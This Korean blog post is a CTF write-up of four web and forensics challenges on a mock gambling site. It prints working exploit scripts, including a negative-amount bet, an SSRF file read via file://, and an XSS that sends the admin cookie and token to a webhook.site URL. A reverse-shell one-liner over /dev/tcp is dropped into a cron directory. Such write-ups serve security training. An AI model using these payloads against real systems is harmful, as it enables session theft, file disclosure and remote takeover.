---
title: "[화이트햇콘테스트-예선] Web+Forensics Writeup"
categories: [writeups, CTF]
tags: [web, CTF, forensics, writeup]
---

# Buffalo [Steal] Writeup

## Introduction

> **Buffalo [Steal] (269 pts, 39 solves)** > <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
> <br>URL : http://3.36.92.61/
> {: .prompt-info }

![mypage](/assets/img/buffalo-steal-writeup-1.png){: .shadow }
_처음 회원가입 후 로그인한 뒤 마이페이지_

## Code Analysis

### mypage.php

```php
<?php

define("_BUFFALO_", 1);
define("_LOGIN_BYPASS_", 1);

include "__common.php";

if(isset($_POST["nick"])) {
    $n = bin2hex($_POST["nick"]);
    $u = bin2hex($user["userid"]);
    $p = sha1($_POST["pw"]);

    if($p !== $user["pw"]) {
        die("<script nonce=$nonce>alert('Incorrect password'); location.href = '/mypage.php';</script>");
    }
    $conn->query("
        UPDATE user SET nick = '$n' WHERE userid = '$u'
    ");
}
?>

<html>
    <head>
        <?php include "_head.php" ?>
    </head>
    <body>
        <?php include "_navbar.php" ?>
        <div class="row mt-5">
            <form class="col-6 offset-3" method="POST">

            <p class="mb-4">
                    Your current credit : <b><?=number_format($user["credit"])?> BFLs</b><br>
                    Your Level :
                    <?php
                        if ($user["credit"] > 1e8) {
                            $level = "VVIP";
                        }
                        else if ($user["credit"] > 1e5) {
                            $level = "VIP";
                        }
                        else if ($user["credit"] > 5e4) {
                            $level = "Platinum";
                        }
                        else if ($user["credit"] > 2e4) {
                            $level = "Gold";
                        }
                        else if ($user["credit"] > 1e4) {
                            $level = "Silver";
                        }
                        else if ($user["credit"] > 50) {
                            $level = "Bronze";
                        }
                        else if ($user["credit"] > 10) {
                            $level = "Useless";
                        }
                        else {
                            $level = "Poor";
                        }

                        echo $level;
                    ?> <br>
                    <?php
		    $excl = "<span class='text-danger'>UNAVAILABLE</span>";

		    $x = scandir("__flag/");
		    foreach($x as $uuu) {
			if($uuu[0] == '.') continue;
		        include "__flag/$uuu";
		    }

                    if ($level == "VVIP") {
                        $excl = "<span class='text-success'>$flag</span>";
                    }
                    else if ($level == "VIP") {
                        $excl = "<span class='text-warning'>".substr($flag, 0, 10)."</span> (trial)";
                    }
                    echo "VVIP Member Exclusive :: <b>$excl</b>";
                    ?>
                </p>

                <div class="form-outline mb-4">
                    <input type="text" class="form-control" value="<?=$user["userid"]?>" disabled/>
                    <label class="form-label">User ID</label>
                </div>


                <div class="form-outline mb-4">
                    <input type="text" id="nick" name="nick" value="<?=$user["nick"]?>" class="form-control" />
                    <label class="form-label" for="nick">Nickname</label>
                </div>

                <div class="form-outline mb-4">
                    <input type="password" id="pw" name="pw" class="form-control" />
                    <label class="form-label" for="pw">Password</label>
                </div>

                <p>
                    For security reason, you only can change your nickname.<br>
                    In addition, you have to verify your password
                </p>

                <button type="submit" class="btn btn-primary btn-block mb-4">Update</button>
            </form>
        </div>
    </body>
</html>
```
{: file="mypage.php" }

mypage.php 코드를 보면 VVIP 레벨이 되면 Flag 파일을 보여주는 것 같았습니다.
또한 VVIP 레벨이 되기 위해서는 100000000 BFL 이 필요하다는 것을 위 PHP 스크립트를 통해서 알 수 있습니다.

BFL 를 벌어들일 수 있는 타겟을 찾다가, 도박게임인 가위바위보 그리고 슬롯머신 코드를 보게 되었습니다.

먼저 슬롯머신 게임의 경우 어떤 경우에도 지게 되는 로직이었습니다.

### game_slot.php

```php
<?php
define("_BUFFALO_", 1);

include "../__common.php";
include "./_api_common.php";

if(isset($USER_DATA["amount"])) {
    $am = (float)$USER_DATA["amount"];
    $u = bin2hex($user["userid"]);

    if($am > $user["credit"] || $am <= 0) {
        error("Invalid bet");
    }
    mysqli_query($conn, "update user set credit = credit - $am where userid = '$u'");


    success("You lose");
}
error("Invalid API call");
```
{: file="api/game_slot.php" }

반면 가위바위보의 경우에는 확률적으로 이기는 로직이었습니다.

### game_rsp.php

```php
<?php
define("_BUFFALO_", 1);

include "../__common.php";
include "./_api_common.php";

$sel = $USER_DATA["sel"];
if($sel == "win" || $sel == "lose" || $sel == "draw") {
    $am = (float)$USER_DATA["amount"];
    $u = bin2hex($user["userid"]);

    if($am > $user["credit"]) {
        error("Invalid bet");
    }
    mysqli_query($conn, "update user set credit = credit - $am where userid = '$u'");

    //0, 1, 2 : rock, scissors, paper
    $stack = random_choice(array(
        0 => 1, 1 => 1, 2 => 1
    ));

    $result_table = array(
        "win" => 100, "lose" => 100, "draw" => 100
    );

    //top secret: it's not fair game
    $result_table[$sel] -= 5;
    $result = random_choice($result_table);

    $heap = $stack;
    if($result == "win") {
        $heap = ($stack + 1) % 3;
    }
    else if ($result == "lose") {
        $heap = ($stack + 2) % 3;
    }

    $win = false;
    if($result == $sel) {
        $pay = $am * 1.95;
        mysqli_query($conn, "update user set credit = credit + $pay where userid = '$u';");
        $win = true;
    }

    success("", array(
        "win" => $win,
        "stack" => $stack,
        "heap" => $heap
    ));
}
error("Invalid API call");
```
{: file="api/game_rsp.php" }

다만, 눈 여겨볼 점으로는 am 변수 값에 credit amount 값이 들어가게 되는데, mysql query 문을 보면 -(마이너스)연산자로 credit 값을 연산하고 있고, 음수에 대한 필터링이 별도로 없는 것을 알 수 있었습니다. 때문에 credit amount 값을 음수로 주어 비용으로 지불하는 값을 차감되는 게 아니라 오히려 돈을 불릴 수 있는 취약점이 발생하게 됩니다.

## Exploit

공격 페이로드는 다음과 같습니다.

```javascript
$.post("/api/game_rsp.php", {
  amount: "-99999999999999",
  sel: "win",
});
```

그리고 결과를 확인해보면 돈이 엄청 불어나 Flag 값이 보이는 것을 알 수 있습니다.

![flag](/assets/img/buffalo-steal-writeup-2.png){: .shadow }
_credit boom! flag boom!_

---

# Buffalo [Secret] Writeup

## Introduction

> **Buffalo [Secret] (469 pts, 15 solves)** > <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
> <br>URL : http://3.36.92.61/
> {: .prompt-info }

Steal 문제와 동일한 소스코드를 제공하고 있었기에, 또 다른 flag가 있나 싶어 찾아봤고, 제공받은 소스코드로부터 루트 디렉터리 경로에 `flag_SECRET.txt` 라는 파일명이 있는 것을 확인했습니다.

## Code Analysis

아래는 Dockerfile의 내용 중 일부입니다.

### Dockerfile

```shell
COPY botsrc /app
WORKDIR /app
RUN npm i puppeteer

COPY src/ /var/www/html
RUN chown -R www-data:www-data /var/www/html
RUN chmod -R 775 /var/www/html

COPY spawn.sh /tmp/
RUN chmod +x /tmp/spawn.sh

COPY /flag_SECRET.txt /
```
{: file="Dockerfile" }

때문에 우선 Directory Path Traversal/Arbitrary File Read 취약점이 있는지 살펴보았습니다.

그리고 마침 api 중에 slot_reg.php 코드에서 발견될 수 있었습니다.

### api/slot_reg.php

```php
<?php
define("_BUFFALO_", 1);

include "../__common.php";
include "./_api_common.php";

if($is_admin) {
    $slotid = $USER_DATA["slotid"];
    $reel_blur = $USER_DATA["reel_blur"];
    $reel = $USER_DATA["reel"];
    $slot_name = $USER_DATA["name"];
    $uid = sha1($slotid);

    $bp = "../assets/slot/{$slot_name}-$slotid";

    @mkdir("../assets/slot/{$slot_name}-$slotid/");
    @curl_download($reel_blur, "$bp/$uid-reel_blur.jpg");
    @curl_download($reel, "$bp/$uid-reel_1.jpg");
    @curl_download($reel, "$bp/$uid-reel_2.jpg");
    @curl_download($reel, "$bp/$uid-reel_3.jpg");

    success("Success");
}
error("Invalid API call");


function curl_download($url, $output) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $st = curl_exec($ch);
    $fd = fopen($output, 'w');
    fwrite($fd, $st);
    fclose($fd);

    curl_close($ch);
}
```
{: file="api/slot_reg.php" }

slotid 변수 값을 조작해 임의 디렉터리로 이동할 수 있을 것 같았고, reel_bur 또는 reel 변수를 조작해 임의의 파일을 읽을 수 있을 것 같았습니다. curl_download 함수에서는 url 의 결과값을 ouput 파일에 저장하는 함수입니다. 이를 이용해서 file:// 프로토콜로 로컬에 있는 임의 파일을 읽어들여, 그 파일의 내용물을 웹 경로로부터 접근할 수 있는 디렉터리인 assets/slot/ 경로에 임의 jpg 파일을 생성하고 해당 파일의 내용을 읽어들이면 문제는 풀릴 것 같았습니다.

다만 그전에 $USER_DATA의 경우 어떤 방식으로 정의되는지 살펴볼 필요가 있었습니다. 이는 \_api_common.php 파일에 정의되어 있었습니다.

### api/\_api_common.php

```php
<?php
// ...

$USER_DATA = NULL;
if($_SERVER["CONTENT_TYPE"] == "application/json") {
    $JSON_DATA = json_decode(file_get_contents("php://input"));
    if($JSON_DATA == null) $JSON_DATA = array();
    $USER_DATA = array_merge($JSON_DATA, $_GET);
}
else {
    $USER_DATA = $_POST;
}

// ...
?>
```
{: file="api/\_api_common.php" }

Content-Type이 application/json 이면 GET 파라미터들을 user_data에 합치는 것을 알 수 있었습니다.

하지만 이 Content-Type을 조작하려면 header 값을 조작할 수 있어야 했는데, 위에서 본 api 인 slot_reg.php 에서는 $is_admin 변수로 관리자인지 확인하는 조건문이 존재합니다.

관리자인지 확인하는 조건문이 동작하는 방식은 IP주소가 127.0.0.1 인지만 확인합니다. 이는 \_\_common.php 코드에서 확인할 수 있었습니다.

### \_\_common.php

```php
if($is_logined && $user["userid"] == "admin") {
    if($_SERVER["REMOTE_ADDR"] == "127.0.0.1") {
        $is_admin = true;
    } else {
        $is_admin = false;
    }
}
```
{: file="\_\_common.php" }

관리자로 요청을 하기 위해서는 웹페이지에 구현되어 있는 Report a bug 기능(/cs/report.php)를 사용해야 했습니다.

하지만 이 report.php 에서는 URL만 넘겨줄 수 있으므로 GET 메소드 요청밖에 지원되지 않는 것을 알 수 있습니다. 때문에 Request Header 값을 조작할 수 있는 다른 수단이 필요해보였습니다.

그러다가 마침 admin/reg_slot.php 파일 내용 중 일부에 해당 코드가 있었습니다.

### admin/reg_slot.php

```php
<?php
// ...
$hdrs = array();

//Further API calls
if(isset($_GET["headers"])) {
    //To support proxying headers
    foreach($_GET["headers"] as $k => $v) {
        $k = trim($k);
        $hdrs[$k] = $v;
    }
}
// ...
?>
```
{: file="admin/reg_slot.php" }

이렇게 된다면, /admin/reg_slot.php 경로로 GET 파라미터로 headers 라는 배열을 headers\[Content-Type\]=application/json 형태로 주어서 $USER_DATA 입력 받을 때 GET 파라미터도 허용할 수 있게 해줄 수 있게 되는 것을 알 수 있습니다.

그리고 다시 /admin/reg_slot.php 파일의 전체 코드를 보면 다음과 같습니다.

```php
<?php
define("_BUFFALO_", 1);

include "__common.php";

$hdrs = array();

//Further API calls
if(isset($_GET["headers"])) {
    //To support proxying headers
    foreach($_GET["headers"] as $k => $v) {
        $k = trim($k);
        $hdrs[$k] = $v;
    }
}

$slot_name = "Buffalo";
if(isset($_GET["name"])) {
    $slot_name = addslashes($_GET["name"]);
}

$slot_id = sha1(random_bytes(32));

?>
<html>
    <head>
        <?php include "../_head.php" ?>
    </head>
    <body>
        <?php include "_navbar.php" ?>
        <div class="container mt-5">
            <h3>Register Slot </h3>
            <p>
                For security reason, only registering is enabled.<br>
                To setup the slots (loading reel images, ...), please use a tool delivered via telegram.
            </p>
            <form>
                <input type="hidden" id="slotid" value="<?=$slot_id?>"><br>
                <input type="text" id="reel_blur" placeholder="Reel image (blurred)" disabled><br>
                <input type="text" id="reel" placeholder="Reel image" disabled>
                <button type="button" id="register">Register</button>
            </form>
        </div>
        <script nonce=<?=$nonce?>/>
            $("#register").click(() => {
                let headers = JSON.parse(`<?=json_encode($hdrs)?>`);
                let action = "/api/slot_reg.php?name=<?=$slot_name?>";
                let method = "POST";
                $.ajax({url: action,
                    type: 'post',
                            data: {
                                slotid: $("#slotid").val(),
                                //reel_blur: $("#reel_blur").val(),
                                //reel: $("#reel").val()
                            },
                            headers: headers,
                            success: () => {
                                alert("Done");
                            }
                })

            });
        </script>
    </body>
</html>
```
{: file="admin/reg_slot.php" }

여기서 api/slot_reg.php?name= 뒤에 오는 slot_name 변수의 값이 문자열 그대로 들어가고 있기 때문에 뒤에 다른 파라미터 값들도 이어 붙여줄 수가 있습니다. 그리고 headers 는 application/json 으로 들어가게 되어 GET 파라미터의 값들을 전부 USER_DATA에 merge 해줍니다.

그럼 URL을 만들어보면 아래와 같은 형태가 만들어집니다.

```
http://localhost/admin/reg_slot.php?headers[CONTENT-TYPE]=application/json&name=asdf%26slotid=asdf%26reel_blur=file:///etc/passwd%26reel=asdf
```

다만 여기서 문제는 이제 reg_slot.php 에 다음과 같은 파라미터들을 보낸다고 해서 api/slot_reg.php 로 알아서 보내 주는 것이 아닌 점입니다.

reg_slot.php 코드에서 아래 script 태그에 정의 되어있는 $("#register").click() 코드가 실행되어야지 비로소 api/slot_reg.php?name= 경로로 호출이되어 집니다.

그럼 어떻게 버튼을 누르게 할 수 있을까 코드를 더 보다가 마침 \_head.php 에 정의된 내용 중에 아래와 같은 내용을 볼 수 있었습니다.

```html
<script src="/assets/auto_game.js" nonce="<?=$nonce?>"></script>
```

auto_game.js 파일의 내용은 다음과 같습니다.

### assets/auto_game.js

```javascript
$(() => {
  try {
    let id = location.hash.substr(1);
    let x = $(`#${id}`);
    if (x) {
      x.click();
    }
  } catch {
    console.log("~");
  }
});
```
{: file="assets/auto_game.js" }

바로 특정 ID에 대한 # hash tag 가 주어지면 해당 요소를 자동으로 클릭해주는 기능이었습니다.

이를 이용하면 관리자가 register 버튼을 누르게 할 수 있을 것 같았습니다.

## Exploit

결과적으로 최종 페이로드는 다음과 같아집니다.

```
http://localhost/admin/reg_slot.php?headers[CONTENT-TYPE]=application/json&name=asdf%26slotid=asdf%26reel_blur=file:///etc/passwd%26reel=asdf#register
```

그리고 asdf 의 sha1 해시값을 구해서 assets 하위에 있는 이미지 파일에 접근해보면 다음과 같이 /etc/passwd 파일의 내용을 확인해볼 수 있습니다.

```
http://3.36.92.61/assets/slot/asdf-asdf/3da541559918a808c2402bba5012f6c60b27661c-reel_blur.jpg
```

![etc_passwd](/assets/img/buffalo-secret-writeup-1.png){: .shadow }
_/etc/passwd_

동일한 원리를 이용해서 Flag 파일을 추출해보았습니다.

```
http://localhost/admin/reg_slot.php?headers[CONTENT-TYPE]=application/json&name=asdf%26slotid=asdf%26reel_blur=file:///flag_SECRET.txt%26reel=asdf#register
```

![flag2](/assets/img/buffalo-secret-writeup-2.png){: .shadow }
_flag_SECRET.txt_

이렇게 Flag 값을 구할 수 있었습니다.

---

# Buffalo [Safer] Writeup

## Introduction

> **Buffalo [Safer] (488 pts, 10 solves)** > <br>much safe buffalo
> <br>URL : http://3.39.255.32/
> {: .prompt-info }

지문에도 나와 있다시피 더 안전해진 buffalo 라고 합니다.
뭐가 달라졌는지 제공된 소스코드를 보았습니다.

## Code Analysis

### api/game_rsp.php

```php
<?php
define("_BUFFALO_", 1);

include "../__common.php";
include "./_api_common.php";

$sel = $USER_DATA["sel"];
if($sel == "win" || $sel == "lose" || $sel == "draw") {
    $am = (float)$USER_DATA["amount"];
    $u = bin2hex($user["userid"]);

    if($am > $user["credit"] || $am < 0.25) {
        error("Invalid bet");
    }
    mysqli_query($conn, "update user set credit = credit - $am where userid = '$u'");

    //0, 1, 2 : rock, scissors, paper
    $stack = random_choice(array(
        0 => 1, 1 => 1, 2 => 1
    ));

    $result_table = array(
        "win" => 100, "lose" => 100, "draw" => 100
    );

    //top secret: it's not fair game
    $result_table[$sel] -= 5;
    $result = random_choice($result_table);

    $heap = $stack;
    if($result == "win") {
        $heap = ($stack + 1) % 3;
    }
    else if ($result == "lose") {
        $heap = ($stack + 2) % 3;
    }

    $win = false;
    if($result == $sel) {
        $pay = $am * 1.95;
        mysqli_query($conn, "update user set credit = credit + $pay where userid = '$u';");
        $win = true;
    }

    success("", array(
        "win" => $win,
        "stack" => $stack,
        "heap" => $heap
    ));
}
error("Invalid API call");
```
{: file="api/game_rsp.php" }

이전에는 am 변수 값이 음수가 삽입이 가능해서 단순하게 돈을 불릴 수 있었는데, 이제는 0.25 보다 작으면 안되고, 사용자가 가지고 있는 credit 보다 커야 한다는 조건이 붙은 것을 볼 수 있습니다.

확실히 더 안전해져서 이제는 단순 편법은 통하지 않을 것 같았습니다. 다른 방법을 탐색해보다가 api/transfer.php 파일을 보게 되었습니다.

### api/transfer.php

```php
<?php
define("_BUFFALO_", 1);

include "../__common.php";
include "./_api_common.php";

if(check_pow($USER_DATA["pow"])) {
    $am = (float)$USER_DATA["amount"];
    $rc = bin2hex($USER_DATA["recv"]);
    $token = sha1($USER_DATA["token"]);

    if($user["userid"] !== "admin") { //admin can copy the money
        if ($am < 5.00) {
            error("Minimum transfer is 5 BFL");
        }

        if ($user["credit"] < $am + 0.05) {
            error("You can't transfer over ".($user["credit"]-0.5)." BFL");
        }

        mysqli_query($conn, "update user set credit = credit - ($am + 0.5) where userid = '".bin2hex($user["userid"])."';");
    }

    if ($token !== $user["token"]) {
        error("Wrong secondary pw");
    }

    mysqli_query($conn, "update user set credit = credit + $am where userid = '$rc';");
    success("Transfer succeed");
}
error("Wrong pow");
```
{: file="api/transfer.php" }

다른 사용자는 안되는데, admin 의 경우에는 돈을 무한히 불릴 수 있었습니다. 이를 이용한다면 관리자가 무한한 돈을 다른 사용자에게 전송해줄 수 있을 것 같았습니다.

admin 계정으로써 transfer 기능을 사용하기 위해서는 두 가지 조건이 필요했습니다.

첫번째로 admin 계정을 탈취해야 하고, 두번째로 admin 계정의 token 값을 알아야 타 계정으로 credit을 보낼 수 있습니다.

계정 탈취라고 하면 password cracking 또는 session hijacking 이 가장 일반적인 방법입니다. 우선 SQL Injection 타겟은 없어보였고, password 도 따로 구할 수 있는 방법도 없어보였습니다. 때문에 세션탈취 쪽으로 방향을 잡고 XSS 취약점을 탐색했습니다.

그러다 이전 문제에서 한번 살펴보았던 admin/reg_slot.php 파일의 javascript 부분에서 XSS 타겟을 찾을 수 있었습니다.

### admin/reg_slot.php

```php
$("#register").click(() => {
    let headers = JSON.parse(`<?=json_encode($hdrs)?>`);
    let action = "/api/slot_reg.php?name=<?=$slot_name?>";
    let method = "POST";
    $.ajax({url: action,
        type: 'post',
                data: {
                    slotid: $("#slotid").val(),
                    //reel_blur: $("#reel_blur").val(),
                    //reel: $("#reel").val()
                },
                headers: headers,
                success: () => {
                    alert("Done");
                }
    })

});
```
{: file="admin/reg_slot.php" }

바로 JSON.parse 함수 내부에서 backtick(`)으로 문자열이 들어간다는 것입니다. backtick을 사용하고 있으면 ${}로 임의 javascript를 삽입할 수 있는 상태를 의미하기도 합니다. 이 방법 외에도 그냥 JSON.parse 함수를 탈출하는 방법도 존재합니다.

session 의 경우에는 document.cookie 를 가져오면 됩니다. 그럼 타 계정에 돈을 보내기 위해서 반드시 필요한 token(second pw) 값은 어디서 구할 수 있을까 찾다가 다른 문제에서 봤던 \_head.php 에서 다음과 같은 코드를 발견할 수 있었습니다.

### \_head.php

```php
let secret_token = btoa('<?=$user["userid"].".".$user["token"]?>').replaceAll("+", "%2b");
```
{: file="\_head.php" }

javascript로 secret_token 이라는 값으로 사용자의 token 값을 base64 인코딩해서 대입하고 있는 것을 알 수 있습니다.

이렇게 위 정보들을 토대로 XSS 공격 페이로드를 만들 수 있게 되었습니다. XSS 공격을 보내는 페이로드는 PoW 계산이 번거로워 Python 코드로 작성하였습니다.

## Exploit

```python
import time
import sys
import base64
import requests
from hashlib import sha1
client = requests.Session()
def getPow(p):
    for i in range(0, 10000000):
        if sha1(str(i).encode()).hexdigest()[:5] == p:
            return i
cookie = '4903b3e04c24129e61f615b6be8b609f'
ip = '3.39.255.32'
url = f'http://{ip}/cs/report.php'
res = client.get(url=url, headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
    'Cookie': f'PHPSESSID={cookie}'
})
a = res.text.find('</code>')
p = res.text[a-5:a]
pow = getPow(p)
getcookie_payload = base64.b64encode(f'https://webhook.site/da959eff-f338-4161-b161-8139539f7820?a='.encode()).decode().replace('=','') # %2Bdocument.cookie%2Bsecret_token
res = client.post(url=url, data={
    'url': 'http://localhost/admin/reg_slot.php?headers[]=`);});fetch(atob(`'+str(getcookie_payload)+'`)%2Bdocument.cookie%2Bsecret_token,JSON.parse(atob(`eyJoZWFkZXJzIjp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSwibWV0aG9kIjoicG9zdCIsIm1vZGUiOiJjb3JzIiwiY3JlZGVudGlhbHMiOiJpbmNsdWRlIn0`)));setTimeout(function+a(){(`{',
    'pow': pow
}, headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
    'Cookie': f'PHPSESSID={cookie}'
})
```
{: file="exploit.py" }

위 페이로드를 실행하게 되면 다음과 같이 webhook으로 세션 값과 secret_token 값을 받아올 수 있게 됩니다.

![xss](/assets/img/buffalo-safer-writeup-1.png){: .shadow }
_document.cookie와 secret_token 값 탈취한 모습_

```
35eefd0ce2f96afbd7664d94aaceca22
YWRtaW4uYTUxODI0NjNhODVlZWJjNTRiNGM3NGMzZTJkZmQwMTI2ZTEyYzcyYg==
-> admin.a5182463a85eebc54b4c74c3e2dfd0126e12c72b
-> a5182463a85eebc54b4c74c3e2dfd0126e12c72b:beefcafe
```

그리고 secret_token 값의 token 값 부분은 sha1 crack 을 돌려보면 beefcafe 문자열인 것을 알 수 있습니다.

이제 타 계정으로 돈 보내기에 필요한 조건은 다 갖춰졌습니다. 우선 mypage.php 에 들어가서 관리자가 맞는지 확인해줍니다.

![admin_mypage](/assets/img/buffalo-safer-writeup-2.png){: .shadow }
_admin's mypage_

관리자 계정으로 잘 접속된 것을 확인하였으니 /cash/transfer.php 페이지에 접속해줍니다.

![transfer](/assets/img/buffalo-safer-writeup-3.png){: .shadow }
_transfer page_

다만 돈을 보내려고 하면 Frontend 쪽에서 javascript로 아래와 같이 못보낸다고 막아놓은 상태이기 때문에 아예 API로 직접 전송해줍니다.

```javascript
if (amount + 0.5 > 0.049999999999954525) {
  alert(`You can't transfer over ${0.049999999999954525 - 0.5} BFL`);
  return;
}
```

보내는 코드는 아래와 같습니다.

```javascript
$.post("/api/transfer.php", {
  amount: "99999999999999",
  recv: "domdomi_test",
  token: "beefcafe",
  pow: "886932",
});
```

위코드를 실행하게 되면 아래와 같이 잘 보내진 것을 확인할 수 있습니다.

![transfer_ok](/assets/img/buffalo-safer-writeup-4.png){: .shadow }
_Transfer succeed_

이제 domdomi_test 계정으로 들어가서 돈이 얼마가 되었는지 확인해보겠습니다.

![flag3](/assets/img/buffalo-safer-writeup-5.png){: .shadow }
_credit boom! flag boom!_

이렇게 Safer 문제의 Flag를 추출할 수 있게 됩니다.

---

# Buffalo [Key] Writeup

## Introduction

> **Buffalo [Key] (499 pts, 4 solves)** > <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
> <br>URL : http://3.39.255.32/
> {: .prompt-info }

Forensics 문제인데 Web 문제랑 동일한 문제파일과 URL 주소를 사용하고 있었습니다. 때문에 웹서버의 Linux 시스템에 대한 Forensics 문제일 것으로 파악이 되었습니다.

기본적으로 특정 OS에 대한 포렌식 문제는 시스템 또는 사용자의 로그 탐색부터 시작됩니다.

때문에 사용자 탐색을 위해 /etc/passwd 파일을 살펴보았습니다.

## Exploit

참고로 임의 파일 읽는 페이로드는 아래와 같습니다.

```python
import time
import sys
import base64
import requests
from hashlib import sha1
client = requests.Session()

def getPow(p):
    for i in range(0, 10000000):
        if sha1(str(i).encode()).hexdigest()[:5] == p:
            return i
cookie = '4903b3e04c24129e61f615b6be8b609f'
ip = '3.39.255.32'
url = f'http://{ip}/cs/report.php'
res = client.get(url=url, headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
    'Cookie': f'PHPSESSID={cookie}'
})
a = res.text.find('</code>')
p = res.text[a-5:a]
pow = getPow(p)
file = sys.argv[1]
getfile_payload = base64.b64encode(
    f'http://localhost/api/slot_reg.php?name=asdf&slotid=asdf&reel=asdf&reel_blur=file://{file}'.encode()).decode().replace('=','')
res = client.post(url=url, data={
    'url': 'http://localhost/admin/reg_slot.php?headers[]=`);});fetch(atob(`'+str(getfile_payload)+'`),JSON.parse(atob(`eyJoZWFkZXJzIjp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSwibWV0aG9kIjoicG9zdCIsIm1vZGUiOiJjb3JzIiwiY3JlZGVudGlhbHMiOiJpbmNsdWRlIn0`)));setTimeout(function+a(){(`{',
    'pow': pow
}, headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
    'Cookie': f'PHPSESSID={cookie}'
})
if 'Done' in res.text:
    time.sleep(3)
    res = client.get(f'http://{ip}/assets/slot/asdf-asdf/3da541559918a808c2402bba5012f6c60b27661c-reel_blur.jpg')
    print(res.text)
else:
    print('Error')
```
{: file="exploit.py" }

/etc/passwd 내용을 보면 아래와 같습니다.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
scheduler:x:1000:1000::/home/scheduler:/bin/bash
```

특이하게 scheduler 사용자가 보입니다.

그전에 우선 root 의 .bash_history 파일에 접근 가능한지 살펴보겠습니다.

```shell
cd /
mkdir cronjobs
cd cronjobs
mkdir scripts
chmod 755 .
chmod 777 scripts
scp root@buffalo-server.local:~/scheduler.php .
nohup php scheduler.php &
exit
```

그랬더니 /cronjobs/scripts/ 하위 디렉터리에 scheduler.php 파일을 생성하고 수행 중인 것을 확인할 수 있습니다. 다만 scheduler.php 파일의 내용은 권한이 부족해서인지 읽어볼 수가 없었습니다.

또한 cronjobs 하위 디렉터리에 scripts 디렉터리를 생성한 것으로 보아 해당 디렉터리에서 임의의 shell script를 실행하는 것으로 유추됩니다.

때문에 이전 문제에서 사용했던 임의 경로에 임의의 파일 내용을 읽어와 저장하는 페이로드를 사용해서 리버스 쉘을 올려보았습니다.

```python
import time
import sys
import base64
import requests
from hashlib import sha1
client = requests.Session()
def getPow(p):
    for i in range(0, 10000000):
        if sha1(str(i).encode()).hexdigest()[:5] == p:
            return i
cookie = '4903b3e04c24129e61f615b6be8b609f'
ip = '3.39.255.32'
url = f'http://{ip}/cs/report.php'
res = client.get(url=url, headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
    'Cookie': f'PHPSESSID={cookie}'
})
a = res.text.find('</code>')
p = res.text[a-5:a]
pow = getPow(p)
file = sys.argv[1]
rce_payload = base64.b64encode(
    f'http://localhost/api/slot_reg.php?name=asdf&slotid=asdf/../../../../../../../../cronjobs/scripts/&reel=asdf&reel_blur=https://webhook.site/da959eff-f338-4161-b161-8139539f7820'.encode()).decode().replace('=','')
res = client.post(url=url, data={
    'url': 'http://localhost/admin/reg_slot.php?headers[]=`);});fetch(atob(`'+str(rce_payload)+'`),JSON.parse(atob(`eyJoZWFkZXJzIjp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSwibWV0aG9kIjoicG9zdCIsIm1vZGUiOiJjb3JzIiwiY3JlZGVudGlhbHMiOiJpbmNsdWRlIn0`)));setTimeout(function+a(){(`{',
    'pow': pow
}, headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
    'Cookie': f'PHPSESSID={cookie}'
})
```
{: file="exploit.py" }

webhook 에는 아래와 같은 내용물을 가지도록 했습니다.

```shell
sh -i >& /dev/tcp/아이피주소/포트번호 0>&1
```

그런 다음 제 서버에서 포트 리스닝 시켜두고 페이로드를 실행했습니다.

![reverse_shell](/assets/img/buffalo-key-writeup-1.png){: .shadow }
_reverse shell_

그랬더니 리버스쉘이 연결되는 것을 확인하였습니다.

![reverse_shell2](/assets/img/buffalo-key-writeup-2.png){: .shadow }
_flag boom!_

